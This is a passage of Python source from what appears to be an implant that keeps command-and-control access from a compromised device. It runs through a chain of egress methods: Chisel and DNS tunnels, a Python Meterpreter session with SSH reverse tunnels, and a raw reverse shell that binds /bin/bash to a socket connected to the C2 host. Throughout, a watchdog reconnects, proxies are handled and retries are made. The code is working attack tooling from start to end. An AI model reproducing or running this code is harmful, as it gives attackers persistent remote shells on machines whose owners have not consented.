                                _meterpreter_socket.shutdown(
                                    socket.SHUT_RDWR)
                            except OSError:
                                pass
                            try:
                                _meterpreter_socket.close()
                            except OSError:
                                pass
                            _kill_exec_thread(t)
                            break

                # ── SSH tunnel startup after stabilization ──────
                if (not _ssh_started and _tunnel_cfg
                        and _poll_tick * _WATCHDOG_INTERVAL
                        >= _SSH_STABILIZE_DELAY
                        and t.is_alive()):
                    _ssh_started = True
                    log.info("Meterpreter stable for %ds — starting "
                             "SSH reverse tunnels", _SSH_STABILIZE_DELAY)
                    _start_ssh_tunnels(
                        c2_host, _tunnel_cfg)

                # ── Check SSH tunnel health ─────────────────────
                if _ssh_started and _ssh_tunnel_proc is not None:
                    if _ssh_tunnel_proc.poll() is not None:
                        _rc = _ssh_tunnel_proc.returncode
                        log.warning("SSH tunnel process died (rc=%d) "
                                    "— restarting", _rc)
                        _start_ssh_tunnels(
                            c2_host, _tunnel_cfg)

            elapsed = time.monotonic() - _t0
            _meterpreter_socket = None
            _stop_ssh_tunnels()

            # exec() blocked for the session lifetime.  Now it's
            # truly dead — mark FAILED for re-cascade.
            if elapsed < 5:
                log.warning("Meterpreter session died after %.1fs — "
                            "backing off 30s before retry", elapsed)
                _current_state = EgressState.FAILED
                try:
                    s.close()
                except OSError:
                    pass
                time.sleep(30)
                return True

            log.warning("Meterpreter session ended after %.0fs — "
                        "marking FAILED for re-cascade", elapsed)
            _current_state = EgressState.FAILED
            try:
                s.close()
            except OSError:
                pass
            return True

        except socket.timeout:
            log.info("Connection to %s:%d timed out", c2_ip, port)
        except ConnectionRefusedError:
            log.info("Connection refused: %s:%d", c2_ip, port)
        except OSError as e:
            log.info("Connection failed: %s:%d — %s", c2_ip, port, e)
        except Exception as e:
            log.error("Meterpreter error: %s", e)

        time.sleep(retry_delay)

    return False

# ── Raw Reverse Shell (last resort) ────────────────────────────

def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
    """Simple Python reverse shell — operator upgrades from listener side.

    Args:
        c2_host: C2 hostname or IP
        ports:   Ports to try
        connect_timeout: Per-attempt timeout
        proxy:   (host, port) or None

    Returns: True if shell connected (returns when shell ends)
    """
    global _c2_method, _current_state, _pty_child_pid

    log.info("Attempting reverse shell to %s on ports %s", c2_host, ports)

    try:
        c2_ip = socket.gethostbyname(c2_host)
    except socket.gaierror:
        log.error("Cannot resolve %s", c2_host)
        return False

    for port in ports:
        log.info("Trying reverse shell: %s:%d", c2_ip, port)
        try:
            if proxy:
                s = _connect_via_proxy(proxy[0], proxy[1], c2_ip, port,
                                       connect_timeout)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(connect_timeout)
                s.connect((c2_ip, port))

            log.info("Reverse shell connected to %s:%d", c2_ip, port)
            _c2_method = "reverse_shell"

            # Fork a child for the shell — parent keeps its own I/O
            # intact and can be killed cleanly via signal handler.
            s.settimeout(None)
            child_pid = os.fork()

            if child_pid == 0:
                # ── Child: become the shell ──
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                s.close()
                os.execvp("/bin/bash", ["/bin/bash", "-i"])
                os._exit(1)  # unreachable unless execvp fails

            # ── Parent: wait for child ──
            _pty_child_pid = child_pid
            try:
                while True:
                    try:
                        os.waitpid(child_pid, 0)
                        break
                    except InterruptedError:
                        # Signal handler fired — retry waitpid to reap
                        continue
            except ChildProcessError:
                pass  # Already reaped (killed by signal handler)
            finally:
                _pty_child_pid = None
                try:
                    s.close()
                except OSError:
                    pass

            # Shell exited — mark FAILED so the main loop re-enters
            # the C2 cascade.
            log.warning("Reverse shell ended — marking FAILED for re-cascade")
            _current_state = EgressState.FAILED
            return True

        except socket.timeout:
            log.info("Reverse shell to %s:%d timed out", c2_ip, port)
        except ConnectionRefusedError:
            log.info("Reverse shell refused: %s:%d", c2_ip, port)
        except OSError as e:
            log.info("Reverse shell failed: %s:%d — %s", c2_ip, port, e)

    return False

# ── Proxy Helpers ───────────────────────────────────────────────

def _connect_via_proxy(proxy_host, proxy_port, target_host, target_port,
                       timeout=10):
    """Establish a TCP connection through an HTTP CONNECT proxy."""
    log.info("Connecting via proxy %s:%d -> %s:%d",
             proxy_host, proxy_port, target_host, target_port)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((proxy_host, proxy_port))

    connect_req = (
        f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
        f"\r\n"
    ).encode()
    s.send(connect_req)

    response = s.recv(4096).decode(errors="replace")
    if "200" in response.split("\r\n")[0]:
        log.info("Proxy CONNECT successful")
        return s
    else:
        log.warning("Proxy CONNECT failed: %s", response.split("\r\n")[0])
        s.close()
        raise ConnectionError(f"Proxy CONNECT failed: {response.split(chr(13))[0]}")


def _recv_exact(sock, n):
    """Receive exactly n bytes from a socket."""
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

# ── Egress Cascade ──────────────────────────────────────────────

def run_cascade(config):
    """Run the full C2 egress cascade.

    Args:
        config: Parsed YAML config dict

    Returns: str method name on success, None on failure
    """
    global _current_state
    _current_state = EgressState.ATTEMPTING

    c2_host = config["c2"]["host"]
    c2_ports = config["c2"]["ports"]
    device_id = _resolve_device_id(config)
    chisel_cfg = config.get("chisel", {})
    dns_cfg = config.get("dns_tunnel", {})
    met_cfg = config.get("meterpreter", {})
    tunnel_cfg = config.get("ssh_tunnels")
    if tunnel_cfg is not None:
        tunnel_cfg["_device_id"] = device_id

    proxy = None
    # If proxy was detected and stored, use it
    proxy_host = config.get("_detected_proxy_host")
    proxy_port = config.get("_detected_proxy_port")
    if proxy_host and proxy_port:
        proxy = (proxy_host, proxy_port)

    # ── Method 0: Chisel HTTPS Tunnel ──────────────────────
    if chisel_cfg.get("enabled", False):
        log.info("=== C2 Method 0: Chisel HTTPS Tunnel ===")
        result = try_chisel(config)
        if result:
            _current_state = EgressState.CONNECTED
            return result

    # ── Method 1: DNS Tunnel ────────────────────────────────
    if dns_cfg.get("enabled", True):
        log.info("=== C2 Method 1: DNS Tunnel ===")
        if try_dns_tunnel(dns_cfg):
            _current_state = EgressState.CONNECTED
            return "dns_tunnel"

    # ── Method 2: Python Meterpreter ────────────────────────
    if met_cfg.get("enabled", True):
        log.info("=== C2 Method 2: Python Meterpreter ===")
        if try_meterpreter(
            c2_host, c2_ports,
            connect_timeout=met_cfg.get("connect_timeout", 10),
            retry_delay=met_cfg.get("retry_delay", 5),
            proxy=proxy,
            tunnel_cfg=tunnel_cfg,
        ):
            # try_meterpreter blocks (exec) for the session lifetime.
            # On return the session is dead; _current_state is already
            # FAILED.  Do NOT overwrite to CONNECTED — return the method
            # name so the main loop knows C2 *was* active, detects FAILED
            # state, and re-enters the cascade.
            return "meterpreter"

    # ── Method 3: Raw Reverse Shell ─────────────────────────
    log.info("=== C2 Method 3: Raw Reverse Shell ===")
    if try_reverse_shell(c2_host, c2_ports, proxy=proxy):
        # try_reverse_shell blocks (pty.spawn) for the shell lifetime.
        # On return the shell is dead; _current_state is already FAILED.
        return "reverse_shell"

    _current_state = EgressState.FAILED
    return None

# ── Watchdog ────────────────────────────────────────────────────

def start_watchdog(config, on_reconnect=None):
    """Monitor C2 health and re-establish on drop.

    Runs in a daemon thread.  Call stop_watchdog() to terminate.
    """
    t = threading.Thread(target=_watchdog_loop, args=(config, on_reconnect),
                         daemon=True)
    t.start()
    return t


def stop_watchdog():
    _watchdog_stop.set()


def _watchdog_loop(config, on_reconnect):
    """Continuous watchdog: check C2 health, re-cascade on failure."""
    retry_interval = config["c2"].get("retry_interval", 60)
    max_retries = config["c2"].get("max_retries", 0)
    backoff = config["c2"].get("backoff_interval", 300)
    retries = 0

    while not _watchdog_stop.is_set():
        _watchdog_stop.wait(15)  # Check every 15 seconds
        if _watchdog_stop.is_set():
            break

        if _current_state != EgressState.CONNECTED:
            continue

        # Check if C2 is still alive.
        # Meterpreter and reverse_shell: the blocking call (exec/pty.spawn)
        # sets _current_state=FAILED on return — the main loop detects it
        # directly, so the watchdog covers chisel and dns_tunnel.
        if _c2_method == "chisel" and not chisel_is_alive():
            log.warning("Chisel process died — re-establishing C2")
            _stop_chisel()
            _attempt_reconnect(config, on_reconnect, retry_interval,
                              max_retries, backoff, retries)

        elif _c2_method == "chisel" and _chisel_stderr_lines:
            # Check for disconnect/error messages in ongoing stderr
            for line in list(_chisel_stderr_lines):
                if "Disconnected" in line or "Give up" in line:
                    log.warning("Chisel reports disconnect: %s", line)
                    _stop_chisel()
                    _attempt_reconnect(config, on_reconnect, retry_interval,
                                      max_retries, backoff, retries)
                    break

        elif _c2_method == "dns_tunnel" and not _dns_tunnel_up():
            log.warning("DNS tunnel dropped — re-establishing C2")
            _attempt_reconnect(config, on_reconnect, retry_interval,
                              max_retries, backoff, retries)


def _attempt_reconnect(config, callback, interval, max_ret, backoff, retries):
    global _current_state
    _current_state = EgressState.ATTEMPTING

    while not _watchdog_stop.is_set():
        method = run_cascade(config)
        if method:
            log.info("C2 re-established via %s", method)
            if callback:
                callback(method)
            return

        retries += 1
        wait = backoff if max_ret and retries > max_ret else interval
        log.info("C2 cascade failed, retry %d in %ds", retries, wait)
        _watchdog_stop.wait(wait)
